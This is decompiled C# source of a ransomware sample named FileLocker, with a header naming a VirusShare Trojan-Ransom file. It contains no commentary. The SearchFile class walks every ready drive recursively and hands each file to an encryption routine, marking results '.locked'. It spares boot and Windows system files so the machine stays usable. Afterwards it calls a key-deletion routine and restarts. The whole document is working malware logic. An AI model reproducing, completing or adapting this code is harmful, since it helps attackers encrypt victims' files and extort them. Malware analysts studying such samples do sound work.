// Decompiled with JetBrains decompiler
// Type: FileLocker.SearchFile
// Assembly: FileLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E5EE51A-6914-4180-A10A-8B6B85AFF127
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Ransom.Win32.Blocker.ibjo-459a487b0ad80fc56c06fca73eb80b3268bd423eaf6da5a1b400a7b5c19fb957.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace FileLocker
{
  public class SearchFile
  {
    public string Dossiersystem;
    private string filename;

    public SearchFile()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.Dossiersystem = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
    }

    public bool XPSystemFiles(string string_0)
    {
      string str = Conversions.ToString(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)[0]) + ":\\";
      return Operators.CompareString(string_0, str + "boot.ini", false) != 0 && Operators.CompareString(string_0, str + "AUTOEXEC.BAT", false) != 0 && Operators.CompareString(string_0, str + "autoexec.bat", false) != 0 && Operators.CompareString(string_0, str + "Bootfont.bin", false) != 0 && Operators.CompareString(string_0, str + "CONFIG.SYS", false) != 0 && Operators.CompareString(string_0, str + "config.sys", false) != 0 && Operators.CompareString(string_0, str + "IO.SYS", false) != 0 && Operators.CompareString(string_0, str + "io.sys", false) != 0 && Operators.CompareString(string_0, str + "MSDOS.SYS", false) != 0 && Operators.CompareString(string_0, str + "NTDETECT.COM", false) != 0 && Operators.CompareString(string_0, str + "ntldr", false) != 0 && Operators.CompareString(string_0, str + "pagefile.sys", false) != 0 && !string_0.StartsWith(str + "w") && !string_0.StartsWith(str + "W") && !string_0.StartsWith(str + "Program Files");
    }

    public void ChercherFichiers(DirectoryInfo directoryInfo_0, string[] string_0)
    {
      try
      {
        string[] strArray = string_0;
        int num = 0;
        while (num < strArray.Length)
        {
          FileInfo[] files = directoryInfo_0.GetFiles("*.*");
          int index = 0;
          while (index < files.Length)
          {
            FileInfo fileInfo = files[index];
            if (!fileInfo.FullName.EndsWith(".locked") && this.XPSystemFiles(fileInfo.FullName))
              EncodeFiles.Encode_File(fileInfo.FullName);
            checked { ++index; }
          }
          checked { ++num; }
        }
        DirectoryInfo[] directories = directoryInfo_0.GetDirectories();
        int index1 = 0;
        while (index1 < directories.Length)
        {
          this.ChercherFichiers(directories[index1], string_0);
          checked { ++index1; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoOptimization)]
    public void method_0()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          this.ChercherFichiers(new DirectoryInfo(driveInfo.RootDirectory.ToString()), new string[5]
          {
            "JPG",
            "BMP",
            "PNG",
            "MP4",
            "AVI"
          });
        checked { ++index; }
      }
      KeyRegistration.DeleteGey();
      Application.Restart();
      ProjectData.EndApp();
    }

    public delegate void MySubDelegate(string x);
  }
}
